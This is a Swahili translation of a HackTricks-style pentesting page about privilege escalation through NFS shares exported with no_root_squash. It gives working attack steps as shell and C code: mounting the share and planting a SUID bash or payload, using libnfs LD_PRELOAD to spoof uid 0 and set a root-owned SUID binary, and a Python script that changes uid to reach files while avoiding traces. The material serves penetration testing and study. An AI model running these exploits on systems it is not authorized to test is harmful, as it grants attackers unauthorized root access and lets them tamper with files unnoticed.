# NFS No Root Squash Misconfiguration Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}


## Maelezo ya Msingi kuhusu Squashing

NFS kwa kawaida (hasa katika linux) huamini `uid` na `gid` zilizoonyeshwa na client anayekuwa akiunganishwa ili kufikia files (ikiwa kerberos haitumiki). Hata hivyo, kuna baadhi ya configurations zinazoweza kuwekwa kwenye server ili **kubadilisha tabia hii**:

- **`all_squash`**: Hufanya squash ya accesses zote, ikim-map kila user na group kuwa **`nobody`** (65534 unsigned / -2 signed). Kwa hiyo, kila mtu huwa `nobody` na hakuna users wanaotumika.
- **`root_squash`/`no_all_squash`**: Hii ndiyo default kwenye Linux na **hufanya squash ya access yenye uid 0 (root) pekee**. Kwa hiyo, `UID` na `GID` yoyote huaminika, lakini `0` hubadilishwa kuwa `nobody` (hivyo hakuna root impersonation inayowezekana).
- **``no_root_squash`**: Configuration hii ikiwashwa haifanyi squash hata kwa root user. Hii inamaanisha kwamba ukimount directory yenye configuration hii unaweza kuifikia kama root.

Katika file ya **/etc/exports**, ukipata directory iliyoconfiguriwa kama **no_root_squash**, basi unaweza **kuifikia** kama **client** na **kuandika ndani** ya directory hiyo **kana kwamba** wewe ndiye **root** wa ndani wa machine.

Kwa maelezo zaidi kuhusu **NFS**, angalia:


{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 using bash:
- **Kumount directory hiyo** kwenye client machine, kisha **kama root kunakili** ndani ya mounted folder binary ya **/bin/bash** na kuipa permissions za **SUID**, halafu **ku-execute kutoka kwenye** victim machine hiyo bash binary.
- Kumbuka kwamba ili uwe root ndani ya NFS share, **`no_root_squash`** lazima iwe imeconfiguriwa kwenye server.
- Hata hivyo, ikiwa haijawezeshwa, unaweza kufanya privilege escalation kuwa user mwingine kwa kunakili binary kwenye NFS share na kuipa permission ya SUID kama user unayetaka kufanya privilege escalation kwake.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 kwa kutumia code iliyocompilewa ya C:
- **Kumount directory hiyo** kwenye mashine ya client, na **kunakili kama root** ndani ya folder iliyomountiwa payload yetu iliyocompilewa ambayo itatumia vibaya permission ya SUID, kuipa haki za **SUID**, na **kuexecute kutoka kwenye mashine ya victim** binary hiyo (unaweza kupata baadhi ya [C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) hapa).
- Vikwazo vilevile kama hapo awali
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwenye mashine yako hadi kwenye mashine ya victim, bado unaweza kutumia Remote version ku-exploit privilege escalation kwa kutunnel ports zinazohitajika**.\
> Trick ifuatayo inatumika ikiwa faili `/etc/exports` **inaonyesha IP**. Katika hali hii, **hutaweza kutumia** kwa hali yoyote ile **remote exploit**, na utahitaji **kutumia vibaya trick hii**.\
> Sharti lingine linalohitajika ili exploit ifanye kazi ni kwamba **export iliyo ndani ya `/etc/export`** **lazima iwe inatumia flag ya `insecure`**.\
> --_Sina uhakika kama trick hii itafanya kazi ikiwa `/etc/export` inaonyesha IP address_--

### Maelezo ya Msingi

Hali hii inahusisha ku-exploit NFS share iliyomountiwa kwenye mashine ya ndani, kwa kutumia udhaifu katika specification ya NFSv3 unaomruhusu client kubainisha uid/gid yake, jambo linaloweza kuwezesha access isiyoidhinishwa. Exploitation inahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), library inayowezesha kutengeneza NFS RPC calls bandia.

#### Ku-compile Library

Hatua za ku-compile library zinaweza kuhitaji marekebisho kulingana na kernel version. Katika hali hii mahususi, fallocate syscalls ziliondolewa kwa kuwekwa comments. Mchakato wa compilation unahusisha commands zifuatazo:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Kufanya Exploit

Exploit inahusisha kuunda programu rahisi ya C (`pwn.c`) inayoinua privileges hadi root na kisha kuendesha shell. Programu inacompile, na binary inayotokana (`a.out`) inawekwa kwenye share ikiwa na suid root, kwa kutumia `ld_nfs.so` kufake uid katika RPC calls:

1. **Compile exploit code:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Weka exploit kwenye share na ubadilishe permissions zake kwa kughushi uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Tekeleza exploit ili kupata root privileges:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell kwa File Access ya Kutoonekana

Baada ya kupata root access, ili kuingiliana na NFS share bila kubadilisha ownership (ili kuepuka kuacha traces), Python script (nfsh.py) hutumika. Script hii hubadilisha uid ili ilingane na ya file inayofikiwa, hivyo kuruhusu kuingiliana na files kwenye share bila matatizo ya permissions:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Tumia kama:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
